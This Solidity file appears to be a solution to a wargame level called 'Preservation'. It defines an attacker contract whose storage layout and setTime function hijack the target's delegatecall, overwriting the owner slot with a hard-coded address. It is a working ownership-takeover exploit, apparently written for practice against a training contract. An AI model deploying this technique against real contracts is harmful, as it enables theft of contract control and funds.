// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Preservation} from "./L17__Preservation.sol";

contract L17_Caller__Preservation {
    address public unused1;
    address public unused2;
    address public ownerThief;

    function setTime(uint256) public {
        ownerThief = 0x90CfBFFb21423219A6BcDbE08f8dC108Ca7EEA75;
    }
}
